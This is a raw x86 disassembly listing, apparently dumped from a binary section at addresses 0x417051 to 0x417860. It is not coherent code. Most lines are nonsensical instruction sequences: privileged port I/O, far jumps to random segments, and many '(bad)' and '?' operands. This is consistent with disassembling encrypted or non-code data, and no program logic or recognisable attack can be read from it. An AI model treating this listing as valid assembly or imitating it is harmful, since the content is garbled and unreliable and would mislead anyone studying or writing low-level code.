  417051:	jg     0x416ff2
  417053:	fmul   QWORD PTR [ecx]
  417055:	lods   al,BYTE PTR ds:[esi]
  417056:	fs fs push ecx
  417059:	scas   eax,DWORD PTR es:[edi]
  41705a:	in     al,dx
  41705b:	call   0xe96f121c
  417060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417061:	out    dx,eax
  417062:	hlt    
  417063:	test   ch,0x8c
  417066:	jbe    0x416fef
  417068:	cmp    DWORD PTR [ebx+0x75],eax
  41706b:	retf   0xd598
  41706e:	mov    BYTE PTR [ebx],ch
  417070:	ins    BYTE PTR es:[edi],dx
  417071:	stos   BYTE PTR es:[edi],al
  417072:	dec    ecx
  417073:	dec    eax
  417074:	jmp    0x417005
  417076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417077:	out    dx,eax
  417078:	adc    ecx,DWORD PTR ds:0xdc990b2
  41707e:	sbb    eax,0x4bb03fc
  417083:	jnp    0x4170b6
  417085:	test   esi,esi
  417087:	cwde   
  417088:	in     eax,0x26
  41708a:	sahf   
  41708b:	cmp    DWORD PTR [ecx+0x5],edi
  41708e:	dec    esp
  41708f:	push   0xa865021
  417094:	cld    
  417095:	or     esi,ecx
  417097:	ja     0x417039
  417099:	inc    edx
  41709a:	inc    esp
  41709b:	pop    ebx
  41709c:	pop    ebx
  41709d:	neg    DWORD PTR [esi]
  41709f:	xor    BYTE PTR [ecx],dh
  4170a1:	mov    eax,ds:0x443f35a3
  4170a6:	xor    esi,esp
  4170a8:	mov    edx,0xe9fe6085
  4170ad:	adc    al,0x81
  4170af:	cmp    DWORD PTR [edx],esp
  4170b1:	push   eax
  4170b2:	ds jge 0x41708b
  4170b5:	cmc    
  4170b6:	xchg   ecx,eax
  4170b7:	dec    eax
  4170b8:	repz inc ebp
  4170ba:	and    BYTE PTR [ebp-0x5e],dl
  4170bd:	jmp    0x4170e6
  4170bf:	in     eax,0xdd
  4170c1:	and    BYTE PTR [esi+eax*4+0x72aa0f86],ch
  4170c8:	call   0xda29:0xb11d00b9
  4170cf:	push   ds
  4170d0:	in     eax,dx
  4170d1:	gs int 0xbc
  4170d4:	xor    DWORD PTR [eax+0x332be16e],ebp
  4170da:	push   edi
  4170db:	cdq    
  4170dc:	adc    eax,0x65a65a4d
  4170e1:	push   esi
  4170e2:	jbe    0x4170e5
  4170e4:	sahf   
  4170e5:	retf   
  4170e6:	(bad)  
  4170e7:	dec    edi
  4170e8:	into   
  4170e9:	cwde   
  4170ea:	dec    ebx
  4170eb:	inc    edx
  4170ec:	outs   dx,BYTE PTR ds:[esi]
  4170ed:	dec    ecx
  4170ee:	sar    BYTE PTR [edi-0x73012403],cl
  4170f4:	aaa    
  4170f5:	xor    BYTE PTR [ebx-0x31],ch
  4170f8:	sbb    al,0xd
  4170fa:	lods   eax,DWORD PTR ds:[si]
  4170fc:	repnz xor esp,DWORD PTR [ebp+ecx*4+0x46da2c60]
  417104:	fld    TBYTE PTR [esi+0x48]
  417107:	(bad)  
  417108:	inc    edi
  41710a:	or     DWORD PTR [edi],edi
  41710c:	stc    
  41710d:	push   0x4497ae4e
  417112:	push   ss
  417113:	arpl   WORD PTR [esp-0x125a0eb8],dx
  41711a:	pop    edx
  41711b:	sar    DWORD PTR [ebx-0x3d5eb619],cl
  417121:	dec    ecx
  417122:	std    
  417123:	retf   0x1900
  417126:	xor    eax,0xca8e6177
  41712b:	cmp    dh,BYTE PTR [ebx-0x55435e55]
  417131:	jns    0x41718c
  417133:	aam    0xcb
  417135:	scas   eax,DWORD PTR es:[edi]
  417136:	pop    esi
  417137:	icebp  
  417138:	sub    ebp,edx
  41713a:	lock cwde 
  41713c:	fsubr  st(7),st
  41713e:	mov    BYTE PTR [eax+0x3da8ad28],cl
  417144:	rcl    BYTE PTR [eax+0x3ba148ab],0x5d
  41714b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41714c:	xor    al,0x75
  41714e:	mov    al,ds:0xc3bc3f27
  417153:	jecxz  0x417142
  417155:	jp     0x417161
  417157:	mov    ?,WORD PTR [ebp+0x5e]
  41715a:	and    esp,DWORD PTR [ebx]
  41715c:	ds retf 0xf947
  417160:	cmp    ah,cl
  417162:	jnp    0x417164
  417164:	mov    eax,0x94844d77
  417169:	sbb    eax,0x40ebaa16
  41716e:	data16 jl 0x417197
  417171:	leave  
  417172:	or     BYTE PTR [eax],0xc1
  417175:	(bad)  
  417176:	dec    edx
  417177:	add    BYTE PTR [edx],al
  417179:	mov    esi,0xf4c8f658
  41717e:	aam    0xbc
  417180:	sub    bh,BYTE PTR [eax+ebx*1+0x48]
  417184:	pushw  ds
  417186:	add    DWORD PTR [ebx+eax*2-0x50],edi
  41718a:	(bad)  
  41718b:	cmp    eax,0xf1de1209
  417190:	es mov ch,0x54
  417193:	imul   edx,esi,0xffffffd7
  417196:	(bad)  
  417197:	push   ebp
  417198:	add    edi,0x69706742
  41719e:	or     DWORD PTR [ecx+edx*8],edi
  4171a1:	inc    eax
  4171a2:	rcr    eax,0xad
  4171a5:	hlt    
  4171a6:	inc    ebp
  4171a7:	addr16 call 0xcf56:0x61d697f1
  4171af:	cmp    ebp,ebp
  4171b1:	cmp    cl,dh
  4171b3:	fnstenv gs:[esi+0x13]
  4171b7:	retfw  
  4171b9:	jg     0x41719c
  4171bb:	shr    BYTE PTR [ebx-0x3a1eb01b],1
  4171c1:	cli    
  4171c2:	push   ds
  4171c3:	jnp    0x41716c
  4171c5:	xchg   DWORD PTR [edi],ecx
  4171c7:	mov    ah,0xf0
  4171c9:	out    0x45,eax
  4171cb:	and    esi,DWORD PTR [esi]
  4171cd:	mov    bh,0x6
  4171cf:	(bad)  
  4171d0:	or     BYTE PTR [edi+0x43],bl
  4171d3:	mov    ebp,0x44534334
  4171d8:	jmp    0xf468:0xb8805d2c
  4171df:	arpl   WORD PTR [edx],di
  4171e1:	ins    BYTE PTR es:[edi],dx
  4171e2:	cbw    
  4171e4:	rcr    DWORD PTR [ebp+0x38726593],0x49
  4171eb:	xchg   esp,eax
  4171ec:	pop    es
  4171ed:	enter  0x17e7,0x20
  4171f1:	pop    es
  4171f2:	mov    edi,0x2205ced6
  4171f7:	lods   al,BYTE PTR ds:[esi]
  4171f8:	inc    ebp
  4171f9:	jge    0x4171ef
  4171fb:	jb     0x417218
  4171fd:	js     0x417267
  4171ff:	sbb    BYTE PTR [ecx],dl
  417201:	iret   
  417202:	loop   0x417283
  417204:	iret   
  417205:	jns    0x417198
  417207:	inc    esi
  417208:	xor    al,0x6
  41720a:	xor    edx,DWORD PTR [ecx-0x2f95a814]
  417210:	lock pop eax
  417212:	dec    eax
  417213:	pop    ss
  417214:	xor    al,0xc1
  417216:	xchg   esp,eax
  417217:	sbb    ebp,0x20
  41721a:	sub    BYTE PTR [edi+0x1027e165],ch
  417220:	rcr    DWORD PTR [eax+0x1],0x9f
  417224:	and    al,0xc0
  417226:	push   esp
  417227:	ret    0xcf21
  41722a:	push   cs
  41722b:	cli    
  41722c:	adc    eax,0x6b13f3c5
  417231:	sbb    al,0xb
  417233:	pop    es
  417234:	push   ebx
  417235:	xchg   esi,eax
  417236:	sub    esp,DWORD PTR [ebx-0x47d698b6]
  41723c:	lock xchg ecx,eax
  41723e:	mov    ah,0xcb
  417240:	daa    
  417241:	mov    ch,0x91
  417243:	jns    0x4172a9
  417245:	or     DWORD PTR [eax+0x61ff1725],edx
  41724b:	inc    esp
  41724c:	jge    0x4172be
  41724e:	pop    edi
  41724f:	sub    BYTE PTR [ecx+0x4e],cl
  417252:	(bad)  
  417253:	mov    DWORD PTR [edi],esi
  417255:	xor    DWORD PTR [edi],edx
  417257:	lea    esp,[esp+edi*2+0x25]
  41725b:	xor    al,0x8d
  41725d:	mov    esp,0x3f9a7e34
  417262:	das    
  417263:	add    al,0xaa
  417265:	inc    ebp
  417266:	sahf   
  417267:	push   0xffffffcb
  417269:	mov    eax,0x259e727d
  41726e:	push   ss
  41726f:	mov    al,0x5d
  417271:	mov    ds:0x819458b0,eax
  417276:	lahf   
  417277:	les    ecx,FWORD PTR [esi-0x518b03ba]
  41727d:	(bad)  
  41727e:	out    dx,al
  41727f:	xchg   ebx,eax
  417280:	cli    
  417281:	outs   dx,BYTE PTR ds:[esi]
  417282:	adc    al,ah
  417284:	mov    al,0xb8
  417286:	out    0xd1,al
  417288:	aaa    
  417289:	pop    esp
  41728a:	xchg   DWORD PTR [ebx+0x20],ebp
  41728d:	pcmpeqb mm4,QWORD PTR [eax+ebp*2+0x3fbc62ec]
  417295:	fdivr  DWORD PTR ds:0xcb360147
  41729b:	pop    es
  41729c:	shr    DWORD PTR [ebx-0x373377d5],0xd5
  4172a3:	push   ecx
  4172a4:	adc    eax,0x7cd9633d
  4172a9:	int3   
  4172aa:	test   al,0x2c
  4172ac:	add    DWORD PTR [edi-0x66308a43],ebp
  4172b2:	sbb    eax,0x99cd4af6
  4172b7:	fucom  st(7)
  4172b9:	sbb    BYTE PTR [ecx],al
  4172bb:	mul    DWORD PTR [edx]
  4172bd:	call   0x6eea:0x56152c58
  4172c4:	mov    ecx,0x276a1fa2
  4172c9:	xor    bl,BYTE PTR [ebx]
  4172cb:	ss pop edx
  4172cd:	inc    ebx
  4172ce:	jp     0x417269
  4172d0:	das    
  4172d1:	mov    DWORD PTR [ebp-0x437626c5],esp
  4172d7:	fwait
  4172d8:	out    0xfe,eax
  4172da:	jge    0x41727a
  4172dc:	outs   dx,BYTE PTR ds:[esi]
  4172dd:	icebp  
  4172de:	jge    0x4172c3
  4172e0:	aas    
  4172e1:	repz adc ebx,DWORD PTR [esp+eiz*4-0x23]
  4172e6:	push   edi
  4172e7:	lods   al,BYTE PTR ds:[esi]
  4172e8:	cmp    DWORD PTR [ebx-0xbd4fe40],0xffffffd0
  4172ef:	mov    ebx,cs
  4172f1:	push   0xaaac9edb
  4172f6:	iret   
  4172f7:	push   edi
  4172f8:	and    BYTE PTR [edi+ebx*1],dh
  4172fb:	sub    eax,0x447e58ab
  417300:	xor    ebx,0xffffffb1
  417303:	pop    ds
  417304:	add    al,0xf3
  417306:	jmp    0x417292
  417308:	stc    
  417309:	dec    eax
  41730a:	mov    eax,ds:0x43c138e6
  41730f:	push   ss
  417310:	mov    esi,0x6c392a7d
  417315:	int3   
  417316:	or     al,BYTE PTR [ecx]
  417318:	push   ss
  417319:	and    esi,esp
  41731b:	stos   DWORD PTR es:[edi],eax
  41731c:	aam    0xf6
  41731e:	daa    
  41731f:	push   ecx
  417320:	adc    al,0xfa
  417322:	mov    edx,0xfd9342ce
  417327:	mov    al,0x79
  417329:	sub    dl,ah
  41732b:	(bad)
  41732f:	in     eax,0xc6
  417331:	addr16 mov edx,0x13586879
  417337:	sub    esp,DWORD PTR [esi+0x5b3d9968]
  41733d:	(bad)  
  41733e:	rep stos BYTE PTR es:[edi],al
  417340:	cmp    BYTE PTR ds:0x4b84ccc2,cl
  417346:	push   esi
  417347:	xchg   ebp,eax
  417348:	mov    cl,0xf6
  41734a:	or     BYTE PTR [ecx],dl
  41734c:	pop    es
  41734d:	mov    ebx,0x853db7b8
  417352:	add    BYTE PTR [edx-0x5f],dl
  417355:	das    
  417356:	ja     0x41735a
  417358:	cmp    BYTE PTR [ebp+0x219cab36],bl
  41735e:	(bad)  ds:0x5c7b68de
  417364:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417366:	rcr    DWORD PTR [ecx],0x86
  417369:	loop   0x41735a
  41736b:	and    eax,0xd3a92eba
  417370:	pop    esi
  417371:	addr16 sub bl,al
  417374:	xor    DWORD PTR [esi+eiz*2-0x4a79212c],ebx
  41737b:	jae    0x41732a
  41737d:	mov    gs,ebx
  41737f:	add    edx,DWORD PTR [eax+0x4]
  417382:	pinsrw mm6,edx,0xcc
  417386:	cdq    
  417387:	xor    al,0xea
  417389:	sub    BYTE PTR [ebx],cl
  41738b:	mov    gs,ebx
  41738d:	mov    eax,ds:0x46fe47f3
  417392:	pop    ss
  417393:	ret    0x5147
  417396:	or     eax,0x28c92987
  41739b:	(bad)  
  41739c:	jmp    0xf90f:0x61ea86b6
  4173a3:	lock and eax,DWORD PTR [ebp-0x657b792]
  4173aa:	mov    al,0xad
  4173ac:	xchg   BYTE PTR [ebx-0x46],ch
  4173af:	out    0xcd,al
  4173b1:	mov    edi,0x516b9687
  4173b6:	aas    
  4173b7:	xchg   edx,eax
  4173b8:	hlt    
  4173b9:	and    edx,DWORD PTR [ebp+0x4516e88]
  4173bf:	sub    edx,DWORD PTR [ebx-0x2a]
  4173c2:	inc    esp
  4173c3:	or     bh,al
  4173c5:	xor    al,cl
  4173c7:	add    al,0x86
  4173c9:	(bad)  
  4173ca:	sbb    al,0xff
  4173cc:	xlat   BYTE PTR ds:[ebx]
  4173cd:	mov    ch,0x87
  4173cf:	adc    DWORD PTR [ebx],eax
  4173d1:	add    ebx,DWORD PTR [ecx]
  4173d3:	and    BYTE PTR [ecx-0x13004ef3],ah
  4173d9:	pop    esi
  4173da:	repz sbb DWORD PTR [ecx-0x4f],0xffffff97
  4173df:	mov    dh,0xd5
  4173e1:	cmp    DWORD PTR [eax*8-0x509e06f4],ebx
  4173e8:	pop    ds
  4173e9:	add    esi,DWORD PTR [ebx-0x7a]
  4173ec:	(bad)  
  4173ed:	or     ebp,DWORD PTR [esi+0x728dd5e5]
  4173f3:	in     eax,0xe3
  4173f5:	push   cs
  4173f6:	out    0x3a,eax
  4173f8:	inc    ebx
  4173f9:	xor    eax,0xd578f43c
  4173fe:	inc    edi
  4173ff:	leave  
  417400:	ds pop esp
  417402:	lea    ebp,[esi+0x5b]
  417405:	inc    edx
  417406:	idiv   eax
  417408:	fnop   
  41740a:	shr    BYTE PTR [esi],0x99
  41740d:	bound  esi,QWORD PTR [esi]
  41740f:	and    bl,BYTE PTR ds:0x8dd219da
  417415:	pop    edi
  417416:	mov    ds:0x9715bb2,al
  41741b:	push   edi
  41741c:	aam    0xd4
  41741e:	mov    al,0xd3
  417420:	lea    eax,[ecx]
  417422:	pop    ss
  417423:	cmc    
  417424:	xor    edi,DWORD PTR [edi+0x2b]
  417427:	push   ss
  417428:	or     ebx,edi
  41742a:	inc    edx
  41742b:	add    bh,BYTE PTR [edi-0x24]
  41742e:	jl     0x4173cc
  417430:	adc    BYTE PTR [edi+0x6e0a3c9],bl
  417436:	call   FWORD PTR [eax-0x14]
  417439:	sub    al,0x19
  41743b:	mov    WORD PTR [ebx+eax*2],ss
  41743e:	in     eax,dx
  41743f:	mov    dh,0x37
  417441:	mov    bh,BYTE PTR [esp+edi*8+0x65230ca1]
  417448:	push   eax
  417449:	outs   dx,BYTE PTR ds:[esi]
  41744a:	arpl   WORD PTR [eax],dx
  41744c:	adc    BYTE PTR [eax],0xc5
  41744f:	bound  esi,QWORD PTR [ebp-0x71]
  417452:	cmc    
  417453:	inc    ebp
  417454:	aaa    
  417455:	call   0xcb1cceeb
  41745a:	jb     0x4174b5
  41745c:	add    BYTE PTR [ebp+0x34],al
  41745f:	js     0x417424
  417461:	aas    
  417462:	loop   0x417462
  417464:	adc    DWORD PTR [edx-0x33],esp
  417467:	inc    eax
  417468:	fs ins DWORD PTR es:[edi],dx
  41746a:	or     BYTE PTR [ebx],dl
  41746c:	xchg   edx,eax
  41746d:	imul   ebx,DWORD PTR [eax],0x56
  417470:	pusha  
  417471:	lock out 0xa1,al
  417474:	out    0x3c,al
  417476:	fwait
  417477:	sub    cl,bl
  417479:	pop    ds
  41747a:	repnz xchg ecx,ecx
  41747d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41747e:	and    esp,eax
  417480:	xor    ch,cl
  417482:	repnz fwait
  417484:	lods   al,BYTE PTR ds:[esi]
  417485:	mov    eax,0x4ade2075
  41748a:	sti    
  41748b:	call   0x3fe35fca
  417490:	js     0x417436
  417492:	sti    
  417493:	xor    eax,0x89dd7271
  417498:	mov    bh,0xc0
  41749a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41749c:	mov    ds:0x9d380ba1,al
  4174a1:	dec    ebp
  4174a2:	push   DWORD PTR [ecx]
  4174a4:	add    eax,0xd463f310
  4174a9:	sub    ch,BYTE PTR [esi-0x438c16e5]
  4174af:	imul   esp,eax,0xfdcddc3b
  4174b5:	stos   DWORD PTR es:[edi],eax
  4174b6:	int    0x8d
  4174b8:	push   0xec690b7e
  4174bd:	cmp    eax,0xe3a6a98a
  4174c2:	sbb    bl,ah
  4174c4:	les    eax,FWORD PTR [ebx+eax*4-0x73582022]
  4174cb:	push   cs
  4174cc:	or     bh,BYTE PTR [edx-0x5186ec12]
  4174d2:	xchg   ecx,eax
  4174d3:	jl     0x41753b
  4174d5:	out    0x3b,eax
  4174d7:	push   ebx
  4174d8:	int3   
  4174d9:	repnz mov cl,BYTE PTR [ecx+0x7b56b41f]
  4174e0:	add    BYTE PTR [esi-0x563a61fd],bh
  4174e6:	sub    DWORD PTR gs:[ebp-0x47],eax
  4174ea:	mov    ch,0x5
  4174ec:	jns    0x417565
  4174ee:	mov    edi,0x28817b68
  4174f3:	mov    dh,0xce
  4174f5:	and    DWORD PTR [ebx],ecx
  4174f7:	add    al,0xfb
  4174f9:	mov    al,0x7a
  4174fb:	dec    ebx
  4174fc:	stc    
  4174fd:	pop    edi
  4174fe:	push   ds
  4174ff:	and    bl,BYTE PTR [edi]
  417501:	into   
  417502:	mov    dl,ch
  417504:	xor    BYTE PTR [eax+0x5d],bl
  417507:	(bad)  
  417509:	out    0xb5,eax
  41750b:	ret    0xc77c
  41750e:	cmp    BYTE PTR [ebx+0x4be16293],bl
  417514:	stos   DWORD PTR es:[edi],eax
  417515:	sub    al,ah
  417517:	sub    ebp,DWORD PTR [ebx+esi*4+0x62a4c54c]
  41751e:	cs imul ebp,edx,0xffffffe4
  417522:	pop    edi
  417523:	mov    ecx,0x27e51c51
  417528:	mov    ?,edi
  41752a:	pushf  
  41752b:	mov    bl,dh
  41752d:	ret    0x4f01
  417530:	ret    0xab19
  417533:	sub    cl,BYTE PTR [edi]
  417535:	les    ebp,FWORD PTR [esi+ecx*8+0x5d96b9e1]
  41753c:	mov    WORD PTR [esi+0x9],es
  41753f:	sbb    al,0x9a
  417541:	push   esi
  417542:	inc    edi
  417543:	add    DWORD PTR [ebp-0x60676c32],ebx
  417549:	popa   
  41754a:	imul   eax,DWORD PTR [ebx+0x4d],0x9ed2c2bc
  417551:	int3   
  417552:	adc    BYTE PTR [esp+ecx*4],dl
  417555:	mul    ah
  417557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417558:	popa   
  417559:	not    esp
  41755b:	and    cl,bh
  41755d:	inc    esp
  41755e:	xor    cl,BYTE PTR [edx]
  417560:	aas    
  417561:	push   0xffffffc7
  417563:	ds dec ecx
  417565:	cmp    al,0x1a
  417567:	out    0xca,eax
  417569:	ja     0x4175c8
  41756b:	mov    WORD PTR [eax-0x3f],fs
  41756e:	jae    0x41754f
  417570:	sub    ah,dl
  417572:	push   0xffffffb2
  417574:	loop   0x417558
  417576:	adc    al,BYTE PTR [esi]
  417578:	adc    eax,DWORD PTR [ebx-0x6]
  41757b:	in     eax,dx
  41757c:	xor    DWORD PTR [ebp-0x49],ecx
  41757f:	aad    0x3f
  417581:	mov    eax,0x2ebb9edb
  417586:	iret   
  417587:	push   ebp
  417588:	add    ch,al
  41758a:	cmp    DWORD PTR [edi+0xba0e8bf],esi
  417590:	jnp    0x4175e1
  417592:	fistp  DWORD PTR fs:[edx-0x45a4c310]
  417599:	dec    eax
  41759a:	mov    esi,0xabe0391
  41759f:	test   eax,0x974ffdda
  4175a4:	cmp    DWORD PTR [esi-0x80],eax
  4175a7:	mov    al,0xf8
  4175a9:	sbb    eax,0x5c
  4175ac:	mov    dh,0xe7
  4175ae:	cmp    bl,BYTE PTR [ecx+0x5da49c0d]
  4175b4:	lods   al,BYTE PTR ds:[esi]
  4175b5:	xor    bh,BYTE PTR [eax]
  4175b7:	into   
  4175b8:	adc    DWORD PTR [ebx+0x929f903],ebx
  4175be:	add    ah,BYTE PTR [ebp+0x14]
  4175c1:	in     eax,dx
  4175c2:	adc    DWORD PTR [ebp-0x19],esi
  4175c5:	fisub  DWORD PTR [ebp-0xa]
  4175c8:	test   BYTE PTR ds:0x7f017c13,0x66
  4175cf:	mov    eax,0xd58618a0
  4175d4:	nop
  4175d5:	sbb    ah,BYTE PTR [ecx]
  4175d7:	fcmovnbe st,st(2)
  4175d9:	or     BYTE PTR [edx+0x6f],dh
  4175dc:	pop    ebp
  4175dd:	mov    ch,0x89
  4175df:	ins    DWORD PTR es:[edi],dx
  4175e0:	test   eax,0x6a238dc0
  4175e5:	add    BYTE PTR [esi-0x308f2d18],bl
  4175eb:	sbb    eax,0x55d5886b
  4175f0:	adc    al,0x85
  4175f2:	out    0xca,eax
  4175f4:	mov    ds:0x9d8eaa29,al
  4175f9:	test   cl,al
  4175fb:	je     0x41757e
  4175fd:	xor    eax,edi
  4175ff:	aaa    
  417600:	sub    bl,dh
  417602:	aas    
  417603:	retf   0xc67b
  417606:	sbb    eax,0x9c168130
  41760b:	shl    BYTE PTR [eax+0x1f52a92d],cl
  417611:	jns    0x417685
  417613:	(bad)  
  417614:	mov    edi,0xea7f236b
  417619:	jo     0x417638
  41761b:	jl     0x4175c5
  41761d:	xchg   DWORD PTR [edi],edx
  41761f:	pop    ebp
  417620:	sbb    DWORD PTR [eax-0x6],ecx
  417623:	out    dx,al
  417624:	ins    DWORD PTR es:[edi],dx
  417625:	imul   edi,esi,0xde6a186a
  41762b:	cmp    bh,dh
  41762d:	mov    ch,0xf2
  41762f:	or     eax,0x40abcaa8
  417634:	das    
  417635:	cmp    eax,0xf9029f41
  41763a:	adc    eax,0xdcd75976
  41763f:	inc    esi
  417640:	jge    0x4176b0
  417642:	adc    al,0x69
  417644:	mov    ss,WORD PTR [ebx-0x37]
  417647:	mov    edx,0x7d5f57d5
  41764c:	pop    edx
  41764d:	retw   0x8e29
  417651:	lock into 
  417653:	lods   al,BYTE PTR ds:[esi]
  417654:	fidiv  WORD PTR [eax]
  417656:	jmp    0x4176a0
  417658:	or     bh,BYTE PTR [eax]
  41765a:	pop    ss
  41765b:	mov    ecx,0xef983c9a
  417660:	imul   ebp,DWORD PTR cs:[edx],0x802cd05b
  417667:	out    0xc5,al
  417669:	shl    BYTE PTR [ecx+0x53],cl
  41766c:	retf   0xb0e6
  41766f:	out    dx,eax
  417670:	inc    eax
  417671:	sub    DWORD PTR [edx+0x3e],ecx
  417674:	ffree  st(5)
  417676:	mov    bh,0xdc
  417678:	inc    ecx
  417679:	mov    ebx,0x92414250
  41767e:	mov    ebx,0xff3f089e
  417683:	into   
  417684:	imul   ebx,ebx,0x27
  417687:	inc    ebp
  417688:	push   ss
  417689:	lds    edx,FWORD PTR [ebp+0x62]
  41768c:	rcr    BYTE PTR [esi+eax*8-0x7c],0x5a
  417691:	out    dx,eax
  417692:	jg     0x4176ae
  417694:	std    
  417695:	test   al,0x11
  417697:	das    
  417698:	dec    edi
  417699:	cdq    
  41769a:	xor    eax,0xd95d6d01
  41769f:	add    ebp,DWORD PTR ds:0x87c48c58
  4176a5:	mov    edx,0x8ddcc230
  4176aa:	cdq    
  4176ab:	test   DWORD PTR [ebx+edi*8],edi
  4176ae:	xor    eax,0x59e1ab5d
  4176b3:	cdq    
  4176b4:	loopne 0x417698
  4176b6:	cmp    bh,BYTE PTR ds:0xd82fe02d
  4176bc:	imul   ecx,DWORD PTR [ecx+0x2c],0x4470f7cf
  4176c3:	cwde   
  4176c4:	aad    0xc7
  4176c6:	add    cl,0x59
  4176c9:	nop    DWORD PTR [edi+eiz*8+0x45]
  4176ce:	and    esp,DWORD PTR [esi+0x3b]
  4176d1:	lea    eax,[eax-0x48bddf7a]
  4176d7:	ja     0x4176d8
  4176d9:	cmc    
  4176da:	jp     0x4176cd
  4176dc:	mov    ch,0xb8
  4176de:	(bad)  ss:[ecx+0x64a83d76]
  4176e5:	jbe    0x417745
  4176e7:	sbb    ebp,DWORD PTR [ecx]
  4176e9:	push   edi
  4176ea:	dec    edi
  4176eb:	dec    eax
  4176ec:	inc    esi
  4176ed:	pop    es
  4176ee:	inc    edx
  4176ef:	aaa    
  4176f0:	es inc ebp
  4176f2:	int3   
  4176f3:	jb     0x4176b9
  4176f5:	popf   
  4176f6:	and    cl,bl
  4176f8:	xor    edi,DWORD PTR [ebx-0x3548ec72]
  4176fe:	jae    0x4176c5
  417700:	xchg   esp,eax
  417701:	shl    BYTE PTR [eax+eax*2+0x53e8dd0b],1
  417708:	mul    DWORD PTR [eax+0x69]
  41770b:	or     BYTE PTR [ebp-0x3c69daf7],bl
  417711:	scas   al,BYTE PTR es:[edi]
  417712:	push   cs
  417713:	inc    eax
  417714:	aad    0xcd
  417716:	jnp    0x417715
  417718:	inc    ecx
  417719:	inc    ecx
  41771a:	jl     0x41775f
  41771c:	xchg   ecx,eax
  41771d:	cwde   
  41771e:	xchg   ecx,eax
  41771f:	or     edx,DWORD PTR [edi+edi*1]
  417722:	push   edx
  417723:	jbe    0x417792
  417725:	fs mov ebx,0x3afb7d27
  41772b:	lahf   
  41772c:	mov    ebx,0x4d50de06
  417731:	into   
  417732:	cli    
  417733:	xchg   ecx,eax
  417734:	pop    eax
  417735:	out    dx,eax
  417736:	rcl    DWORD PTR [ecx+eax*1+0x52],1
  41773a:	sbb    dl,BYTE PTR [esp+esi*1+0x2d]
  41773e:	outs   dx,DWORD PTR ds:[esi]
  41773f:	sahf   
  417740:	mov    esi,0xeef0eff1
  417745:	shr    DWORD PTR ds:0xedf3846b,0xde
  41774c:	adc    ebx,eax
  41774e:	sbb    al,0x2d
  417750:	ins    DWORD PTR es:[edi],dx
  417751:	in     eax,0x75
  417753:	sbb    DWORD PTR [edi-0x22],ebx
  417756:	(bad)  
  417758:	stos   DWORD PTR es:[edi],eax
  417759:	outs   dx,DWORD PTR ds:[esi]
  41775a:	std    
  41775b:	cdq    
  41775c:	aad    0x7a
  41775e:	retf   
  41775f:	(bad)  
  417760:	and    eax,0x2aa551e8
  417765:	gs stos DWORD PTR es:[edi],eax
  417767:	and    ch,ah
  417769:	test   eax,0x2b09837c
  41776e:	xchg   DWORD PTR ds:0x638913ac,ebp
  417774:	(bad)  
  417775:	xchg   edx,eax
  417776:	mov    ecx,0x3f2ce4b3
  41777b:	jl     0x4177d2
  41777d:	shl    edi,1
  41777f:	pushf  
  417780:	cmp    ecx,ebp
  417782:	cmp    eax,0x21d470a3
  417787:	(bad)  
  417788:	ja     0x417727
  41778a:	les    esp,FWORD PTR gs:[edx]
  41778d:	add    al,0x7e
  41778f:	jle    0x41772f
  417791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417792:	jge    0x41777b
  417794:	rcr    ch,1
  417796:	dec    ecx
  417797:	call   0x30182a8f
  41779c:	sub    BYTE PTR [bx+si],dh
  41779f:	(bad)  
  4177a0:	hlt    
  4177a1:	fs pop eax
  4177a3:	adc    ecx,DWORD PTR ds:0x68be9fd6
  4177a9:	add    ah,bh
  4177ab:	lahf   
  4177ac:	adc    eax,0xe5ba6548
  4177b1:	cmp    eax,edi
  4177b3:	adc    DWORD PTR [ecx-0x53a3b9a5],eax
  4177b9:	xor    DWORD PTR [ecx-0x31f49ee7],0x823884f0
  4177c3:	xlat   BYTE PTR ds:[ebx]
  4177c4:	mov    bl,0xef
  4177c6:	and    esi,eax
  4177c8:	xchg   DWORD PTR [edi],edi
  4177ca:	push   cs
  4177cb:	scas   eax,DWORD PTR es:[edi]
  4177cc:	ja     0x4177f8
  4177ce:	push   cs
  4177cf:	push   esp
  4177d0:	dec    edi
  4177d1:	(bad)  
  4177d2:	out    0xb4,al
  4177d4:	xchg   ecx,eax
  4177d5:	xchg   esi,eax
  4177d6:	adc    ecx,DWORD PTR [ebx]
  4177d8:	adc    ebx,edi
  4177da:	cwde   
  4177db:	test   al,0x8
  4177dd:	iret   
  4177de:	or     al,0x3f
  4177e0:	jge    0x417796
  4177e2:	leave  
  4177e3:	in     eax,dx
  4177e4:	lds    edx,FWORD PTR [esi+0x6be775ad]
  4177ea:	out    dx,al
  4177eb:	sbb    al,0x59
  4177ed:	mov    edx,0xa40f9a20
  4177f2:	xor    al,BYTE PTR [edx-0x30]
  4177f5:	pop    ecx
  4177f6:	fld    QWORD PTR [edi+0x24]
  4177f9:	jns    0x417817
  4177fb:	fsub   st(7),st
  4177fd:	sub    al,0xe4
  4177ff:	and    eax,0xdd4d06fa
  417804:	test   al,0x13
  417806:	xor    eax,0xc9a0bf6f
  41780b:	or     bl,BYTE PTR [esi+0x1c9eb0a1]
  417811:	inc    ecx
  417812:	cs push esi
  417814:	fisub  WORD PTR [edx-0x17]
  417817:	icebp  
  417818:	fcom   QWORD PTR [esi-0x6c73852a]
  41781e:	shr    DWORD PTR [edx],1
  417820:	adc    al,0x6a
  417822:	jns    0x417839
  417824:	push   ebx
  417825:	lahf   
  417826:	mov    ds:0xbecf22a0,al
  41782b:	(bad)  
  41782c:	gs test eax,0xd789ec0b
  417832:	outs   dx,DWORD PTR ds:[esi]
  417833:	repz pop esi
  417835:	jmp    0x4177d7
  417837:	and    ebp,edx
  417839:	fwait
  41783a:	fs nop
  41783c:	ins    WORD PTR es:[edi],dx
  41783e:	ret    0x8072
  417841:	fadd   DWORD PTR [ecx+0x237b513b]
  417847:	clc    
  417848:	and    esp,DWORD PTR [ebp-0x378ba2b1]
  41784e:	retf   0x775f
  417851:	push   edx
  417852:	sub    DWORD PTR [esi-0x3a],ecx
  417855:	cmp    eax,0xaafbd9bc
  41785a:	xor    ecx,DWORD PTR [ecx-0x172fa4d3]
  417860:	mov    edx,0x9011ccfa
